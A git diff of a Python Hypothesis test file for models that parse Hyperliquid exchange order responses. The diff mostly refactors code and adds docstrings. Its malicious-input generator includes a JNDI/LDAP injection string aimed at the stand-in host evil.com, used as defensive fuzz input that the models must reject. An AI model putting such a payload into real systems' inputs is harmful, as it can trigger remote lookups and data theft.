@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw exchange response models.
 
 These tests validate critical security boundary models that process external exchange response data.
-The models tested here are essential for order status tracking, execution confirmation, and error handling.
+The models tested here are essential for order status tracking, execution, and error handling.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious response data that could manipulate order status information
@@ -17,7 +17,7 @@ Property testing ensures comprehensive coverage of response edge cases and adver
 
 import json
 from decimal import Decimal
-from typing import Any
+from typing import Any, cast
 
 import pytest
 from hypothesis import assume, given, strategies as st
@@ -35,13 +35,21 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_exchange_response import (
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR EXCHANGE RESPONSE MODEL TESTING
 # =============================================================================
 
 
 def decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for prices and amounts."""
+    """Generate valid decimal strings for prices and amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -60,7 +68,11 @@ def decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def positive_decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid positive decimal strings."""
+    """Generate valid positive decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -73,12 +85,20 @@ def positive_decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def order_id_strategy() -> SearchStrategy[int]:
-    """Generate valid order IDs."""
+    """Generate valid order IDs.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 def status_string_strategy() -> SearchStrategy[str]:
-    """Generate valid status strings."""
+    """Generate valid status strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from([
         "canceled",
         "modified",
@@ -94,7 +114,11 @@ def status_string_strategy() -> SearchStrategy[str]:
 
 
 def error_message_strategy() -> SearchStrategy[str]:
-    """Generate valid error message strings."""
+    """Generate valid error message strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.sampled_from([
             "Order rejected due to insufficient margin",
@@ -120,13 +144,21 @@ def error_message_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_resting_data(draw: DrawFn) -> dict[str, int]:
-    """Generate valid resting status data."""
+    """Generate valid resting status data.
+
+    Returns:
+        dict[str, int]: Generated test data.
+    """
     return {"oid": draw(order_id_strategy())}
 
 
 @st.composite
 def valid_filled_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid filled status data."""
+    """Generate valid filled status data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "oid": draw(order_id_strategy()),
         "totalSz": draw(positive_decimal_str_strategy()),
@@ -136,18 +168,39 @@ def valid_filled_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_status_object_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid status object data."""
+    """Generate valid status object data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
+
+    def _build_resting_status(resting: dict[str, int]) -> dict[str, dict[str, int]]:
+        """Build resting status object."""
+        return {"resting": resting}
+
+    def _build_filled_status(filled: dict[str, Any]) -> dict[str, dict[str, Any]]:
+        """Build filled status object."""
+        return {"filled": filled}
+
+    def _build_error_status(error: str) -> dict[str, str]:
+        """Build error status object."""
+        return {"error": error}
+
     return draw(
         st.one_of([
-            st.builds(lambda resting: {"resting": resting}, resting=valid_resting_data()),
-            st.builds(lambda filled: {"filled": filled}, filled=valid_filled_data()),
-            st.builds(lambda error: {"error": error}, error=error_message_strategy()),
+            st.builds(_build_resting_status, resting=valid_resting_data()),
+            st.builds(_build_filled_status, filled=valid_filled_data()),
+            st.builds(_build_error_status, error=error_message_strategy()),
         ])
     )
 
 
 def status_entry_strategy() -> SearchStrategy[str | dict[str, Any]]:
-    """Generate valid status entries (strings or objects)."""
+    """Generate valid status entries (strings or objects).
+
+    Returns:
+        SearchStrategy[str | dict[str, Any]]: Strategy for generating test data.
+    """
     return st.one_of([
         status_string_strategy(),
         valid_status_object_data(),
@@ -156,7 +209,11 @@ def status_entry_strategy() -> SearchStrategy[str | dict[str, Any]]:
 
 @st.composite
 def valid_response_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid response data."""
+    """Generate valid response data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "type": draw(st.text(min_size=1, max_size=64).filter(lambda x: x.strip())),
         "statuses": draw(st.lists(status_entry_strategy(), min_size=0, max_size=20)),
@@ -165,7 +222,11 @@ def valid_response_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_exchange_response_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid exchange response data."""
+    """Generate valid exchange response data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "status": "ok",  # Must be "ok" according to model
         "data": draw(
@@ -177,8 +238,12 @@ def valid_exchange_response_data(draw: DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_exchange_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for exchange response security testing."""
+def malicious_exchange_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for exchange response security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Exchange response manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-responses}"),
@@ -232,10 +297,10 @@ class TestHyperliquidRawExchangeStatusRestingProperties:
 
     @given(resting_data=valid_resting_data())
     def test_resting_validation_success_properties(self, resting_data: dict[str, int]) -> None:
-        """Property: Valid resting data should always create valid resting objects."""
+        """Property: Valid data should create valid resting objects."""
         # Skip invalid data
         oid = resting_data["oid"]
-        assume(isinstance(oid, int) and oid >= 0)
+        assume(oid >= 0)
 
         obj = HyperliquidRawExchangeStatusResting.model_validate(resting_data)
 
@@ -248,8 +313,8 @@ class TestHyperliquidRawExchangeStatusRestingProperties:
         assert obj.model_config.get("frozen") is True
 
     @given(malicious_value=malicious_exchange_strategy())
-    def test_resting_security_boundary_properties(self, malicious_value: Any) -> None:
-        """Property: Resting status should reject malicious inputs safely."""
+    def test_resting_security_boundary_properties(self, malicious_value: MaliciousInput) -> None:
+        """Property: Resting status should reject malicious inputs."""
         resting_data = {"oid": malicious_value}
 
         # Property: Malicious input should be rejected
@@ -293,10 +358,10 @@ class TestHyperliquidRawExchangeStatusFilledProperties:
 
     @given(filled_data=valid_filled_data())
     def test_filled_validation_success_properties(self, filled_data: dict[str, Any]) -> None:
-        """Property: Valid filled data should always create valid filled objects."""
+        """Property: Valid data should create valid filled objects."""
         # Skip invalid data
         oid = filled_data["oid"]
-        assume(isinstance(oid, int) and oid >= 0)
+        assume(oid >= 0)
 
         # Validate decimal fields
         for field in ["totalSz", "avgPx"]:
@@ -327,10 +392,10 @@ class TestHyperliquidRawExchangeStatusFilledProperties:
         malicious_value=malicious_exchange_strategy(),
     )
     def test_filled_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Filled status should reject malicious inputs safely."""
-        base_data = {
+        """Property: Filled status should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "oid": 12345,
             "totalSz": "1.0",
             "avgPx": "100.0",
@@ -392,14 +457,16 @@ class TestHyperliquidRawExchangeStatusObjectProperties:
 
     @given(status_data=valid_status_object_data())
     def test_status_object_validation_success_properties(self, status_data: dict[str, Any]) -> None:
-        """Property: Valid status object data should always create valid status objects."""
+        """Property: Valid data should create valid status objects."""
         # Validate the structure based on which field is present
         if "resting" in status_data:
             resting = status_data["resting"]
-            assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
+            resting_oid = resting["oid"]
+            assume(isinstance(resting_oid, int) and resting_oid >= 0)
         elif "filled" in status_data:
             filled = status_data["filled"]
-            assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
+            filled_oid = filled["oid"]
+            assume(isinstance(filled_oid, int) and filled_oid >= 0)
             # Validate decimal fields
             for field in ["totalSz", "avgPx"]:
                 value = filled[field]
@@ -437,9 +504,9 @@ class TestHyperliquidRawExchangeStatusObjectProperties:
         malicious_value=malicious_exchange_strategy(),
     )
     def test_status_object_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Status object should reject malicious inputs safely."""
+        """Property: Status object should reject malicious inputs."""
         status_data = {field_name: malicious_value}
 
         # Property: Malicious input should be rejected
@@ -476,7 +543,7 @@ class TestHyperliquidRawExchangeResponseDataProperties:
     def test_response_data_validation_success_properties(
         self, response_data: dict[str, Any]
     ) -> None:
-        """Property: Valid response data should always create valid response data objects."""
+        """Property: Valid data should create valid response data objects."""
         # Skip invalid data
         type_str = response_data["type"]
         assume(isinstance(type_str, str) and type_str.strip())
@@ -506,12 +573,15 @@ class TestHyperliquidRawExchangeResponseDataProperties:
                 valid_statuses.append(status)
             elif isinstance(status, dict):
                 # Validate status object structure
-                if "resting" in status:
-                    resting = status["resting"]
-                    assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
-                elif "filled" in status:
-                    filled = status["filled"]
-                    assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
+                status_dict = cast(dict[str, Any], status)
+                if "resting" in status_dict:
+                    resting = status_dict["resting"]
+                    resting_oid = resting["oid"]
+                    assume(isinstance(resting_oid, int) and resting_oid >= 0)
+                elif "filled" in status_dict:
+                    filled = status_dict["filled"]
+                    filled_oid = filled["oid"]
+                    assume(isinstance(filled_oid, int) and filled_oid >= 0)
                     for field in ["totalSz", "avgPx"]:
                         value = filled[field]
                         assume(isinstance(value, str) and value.strip())
@@ -520,10 +590,10 @@ class TestHyperliquidRawExchangeResponseDataProperties:
                             assume(decimal_val.is_finite())
                         except (ValueError, TypeError):
                             assume(False)
-                elif "error" in status:
-                    error_msg = status["error"]
+                elif "error" in status_dict:
+                    error_msg = status_dict["error"]
                     assume(isinstance(error_msg, str) and error_msg.strip())
-                valid_statuses.append(status)
+                valid_statuses.append(status_dict)
 
         # Update with valid statuses only
         response_data["statuses"] = valid_statuses
@@ -544,10 +614,10 @@ class TestHyperliquidRawExchangeResponseDataProperties:
         malicious_value=malicious_exchange_strategy(),
     )
     def test_response_data_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Response data should reject malicious inputs safely."""
-        base_data = {
+        """Property: Response data should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "type": "order",
             "statuses": ["success"],
         }
@@ -581,7 +651,9 @@ class TestHyperliquidRawExchangeResponseDataProperties:
             ),  # List of invalid strings
         ])
     )
-    def test_response_data_invalid_statuses_properties(self, invalid_statuses: Any) -> None:
+    def test_response_data_invalid_statuses_properties(
+        self, invalid_statuses: MaliciousInput
+    ) -> None:
         """Property: Response data should validate statuses list structure."""
         response_data = {
             "type": "order",
@@ -601,71 +673,81 @@ class TestHyperliquidRawExchangeResponseDataProperties:
 class TestHyperliquidRawExchangeResponseProperties:
     """Property-based tests for exchange response validation and security."""
 
-    @given(exchange_data=valid_exchange_response_data())
-    def test_exchange_response_validation_success_properties(
-        self, exchange_data: dict[str, Any]
-    ) -> None:
-        """Property: Valid exchange response data should always create valid response objects."""
-        # Skip invalid data
-        status = exchange_data["status"]
-        assume(status == "ok")  # Must be "ok" according to model
+    def _validate_status_string(self, status_item: str) -> None:
+        """Validate string status values."""
+        assume(
+            status_item
+            in [
+                "canceled",
+                "modified",
+                "success",
+                "rejected",
+                "failed",
+                "pending",
+                "acknowledged",
+                "working",
+                "filled",
+                "partial",
+            ]
+        )
 
-        # Validate data field if present
+    def _validate_status_object(self, status_item: dict[str, Any]) -> None:
+        """Validate status object structure."""
+        if "resting" in status_item:
+            resting = status_item["resting"]
+            resting_oid = resting["oid"]
+            assume(isinstance(resting_oid, int) and resting_oid >= 0)
+        elif "filled" in status_item:
+            filled = status_item["filled"]
+            filled_oid = filled["oid"]
+            assume(isinstance(filled_oid, int) and filled_oid >= 0)
+            for field in ["totalSz", "avgPx"]:
+                value = filled[field]
+                assume(isinstance(value, str) and value.strip())
+                try:
+                    decimal_val = Decimal(value.strip())
+                    assume(decimal_val.is_finite())
+                except (ValueError, TypeError):
+                    assume(False)
+        elif "error" in status_item:
+            error_msg = status_item["error"]
+            assume(isinstance(error_msg, str) and error_msg.strip())
+
+    def _validate_exchange_data_structure(self, exchange_data: dict[str, Any]) -> None:
+        """Validate the basic structure of exchange data."""
         data = exchange_data["data"]
         if data is not None:
             assume(isinstance(data, dict))
             type_str = data["type"]
             assume(isinstance(type_str, str) and type_str.strip())
 
-            # Validate statuses
             statuses = data["statuses"]
             assume(isinstance(statuses, list))
 
             valid_statuses: list[str | dict[str, Any]] = []
             for status_item in statuses:
                 if isinstance(status_item, str):
-                    assume(
-                        status_item
-                        in [
-                            "canceled",
-                            "modified",
-                            "success",
-                            "rejected",
-                            "failed",
-                            "pending",
-                            "acknowledged",
-                            "working",
-                            "filled",
-                            "partial",
-                        ]
-                    )
+                    self._validate_status_string(status_item)
                     valid_statuses.append(status_item)
                 elif isinstance(status_item, dict):
-                    # Validate status object
-                    if "resting" in status_item:
-                        resting = status_item["resting"]
-                        assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
-                    elif "filled" in status_item:
-                        filled = status_item["filled"]
-                        assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
-                        for field in ["totalSz", "avgPx"]:
-                            value = filled[field]
-                            assume(isinstance(value, str) and value.strip())
-                            try:
-                                decimal_val = Decimal(value.strip())
-                                assume(decimal_val.is_finite())
-                            except (ValueError, TypeError):
-                                assume(False)
-                    elif "error" in status_item:
-                        error_msg = status_item["error"]
-                        assume(isinstance(error_msg, str) and error_msg.strip())
-                    valid_statuses.append(status_item)
+                    status_dict = cast(dict[str, Any], status_item)
+                    self._validate_status_object(status_dict)
+                    valid_statuses.append(status_dict)
 
             data["statuses"] = valid_statuses
 
+    @given(exchange_data=valid_exchange_response_data())
+    def test_exchange_response_validation_success_properties(
+        self, exchange_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid data should create valid response objects."""
+        status = exchange_data["status"]
+        assume(status == "ok")
+
+        self._validate_exchange_data_structure(exchange_data)
+
         obj = HyperliquidRawExchangeResponse.model_validate(exchange_data)
 
-        # Property: Object should be created successfully
         assert isinstance(obj, HyperliquidRawExchangeResponse)
         assert obj.status == "ok"
 
@@ -675,7 +757,6 @@ class TestHyperliquidRawExchangeResponseProperties:
         else:
             assert obj.data is None
 
-        # Property: Model should be configured correctly
         assert obj.model_config.get("extra") == "forbid"
         assert obj.model_config.get("frozen") is True
 
@@ -684,10 +765,10 @@ class TestHyperliquidRawExchangeResponseProperties:
         malicious_value=malicious_exchange_strategy(),
     )
     def test_exchange_response_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Exchange response should reject malicious inputs safely."""
-        base_data = {
+        """Property: Exchange response should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "status": "ok",
             "data": None,
         }
@@ -716,65 +797,15 @@ class TestHyperliquidRawExchangeResponseProperties:
         self, exchange_data: dict[str, Any]
     ) -> None:
         """Property: Exchange response should maintain JSON serialization compatibility."""
-        # Skip invalid data (same validation as success test)
         status = exchange_data["status"]
         assume(status == "ok")
 
-        data = exchange_data["data"]
-        if data is not None:
-            assume(isinstance(data, dict))
-            type_str = data["type"]
-            assume(isinstance(type_str, str) and type_str.strip())
-
-            statuses = data["statuses"]
-            assume(isinstance(statuses, list))
-
-            valid_statuses: list[str | dict[str, Any]] = []
-            for status_item in statuses:
-                if isinstance(status_item, str):
-                    assume(
-                        status_item
-                        in [
-                            "canceled",
-                            "modified",
-                            "success",
-                            "rejected",
-                            "failed",
-                            "pending",
-                            "acknowledged",
-                            "working",
-                            "filled",
-                            "partial",
-                        ]
-                    )
-                    valid_statuses.append(status_item)
-                elif isinstance(status_item, dict):
-                    if "resting" in status_item:
-                        resting = status_item["resting"]
-                        assume(isinstance(resting["oid"], int) and resting["oid"] >= 0)
-                    elif "filled" in status_item:
-                        filled = status_item["filled"]
-                        assume(isinstance(filled["oid"], int) and filled["oid"] >= 0)
-                        for field in ["totalSz", "avgPx"]:
-                            value = filled[field]
-                            assume(isinstance(value, str) and value.strip())
-                            try:
-                                decimal_val = Decimal(value.strip())
-                                assume(decimal_val.is_finite())
-                            except (ValueError, TypeError):
-                                assume(False)
-                    elif "error" in status_item:
-                        error_msg = status_item["error"]
-                        assume(isinstance(error_msg, str) and error_msg.strip())
-                    valid_statuses.append(status_item)
-
-            data["statuses"] = valid_statuses
+        self._validate_exchange_data_structure(exchange_data)
 
         obj = HyperliquidRawExchangeResponse.model_validate(exchange_data)
         json_str = obj.model_dump_json()
         parsed_json = json.loads(json_str)
 
-        # Property: Should be able to reconstruct from JSON
         reconstructed = HyperliquidRawExchangeResponse.model_validate(parsed_json)
         assert reconstructed.status == obj.status
 
